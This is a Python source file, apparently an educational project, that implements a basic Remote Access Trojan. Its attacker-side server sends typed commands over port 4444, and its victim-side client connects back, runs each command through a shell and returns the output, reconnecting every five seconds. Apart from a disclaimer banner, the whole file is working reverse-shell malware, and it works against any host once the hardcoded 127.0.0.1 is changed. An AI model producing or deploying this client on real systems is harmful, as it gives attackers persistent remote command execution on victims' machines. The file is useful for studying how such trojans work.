# - Topics:
# - Learn how Remote Access Trojans work and how attackers use them to control compromised systems.
# - Project:
# - Build a basic RAT in Python that connects to a remote server
# - and allows the attacker to execute commands on the victim's machine




"""
!!! WARNING !!!
FOR EDUCATIONAL PURPOSES ONLY. 
NEVER USE THIS ON SYSTEMS WITHOUT EXPLICIT PERMISSION.
UNAUTHORIZED ACCESS IS ILLEGAL AND CAN RESULT IN SERIOUS CONSEQUENCES
YOU HAVE BEEN WARNED!!! WARNED!!! WARNED!!!.
"""

import socket
import subprocess
import threading
import sys
import time

def server_mode():
    """RAT Server (Attacker)"""
    def handle_client(client_socket):
        try:
            while True:
                cmd = input("shell> ")
                if cmd.lower() in ('exit', 'quit'):
                    break
                client_socket.send(cmd.encode())
                output = client_socket.recv(4096).decode(errors='ignore')
                print(output)
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            client_socket.close()

    HOST = '0.0.0.0'  # Local testing only
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Server listening on {HOST}:{PORT}")

    client_socket, addr = server.accept()
    print(f"[*] Connection from {addr}")
    handle_client(client_socket)
    server.close()

def client_mode():
    """RAT Client (Victim) - FOR DEMONSTRATION ONLY"""
    HOST = '127.0.0.1'  # Replace with server IP for testing
    PORT = 4444

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            
            while True:
                cmd = client.recv(4096).decode(errors='ignore')
                if cmd.lower() in ('exit', 'quit'):
                    break
                try:
                    output = subprocess.getoutput(cmd)
                    client.send(output.encode())
                except:
                    client.send(b"Command failed")
        except:
            time.sleep(5)  # Reconnect attempt delay
            continue

if __name__ == "__main__":
    print("""
    === RAT SIMULATION DEMO ===
    1. Start server (attacker)
    2. Start client (victim)
    """)
    choice = input("Select mode (1/2): ").strip()
    
    if choice == '1':
        server_mode()
    elif choice == '2':
        print("[!] Client connecting to 127.0.0.1:4444")
        client_mode()
    else:
        print("Invalid choice")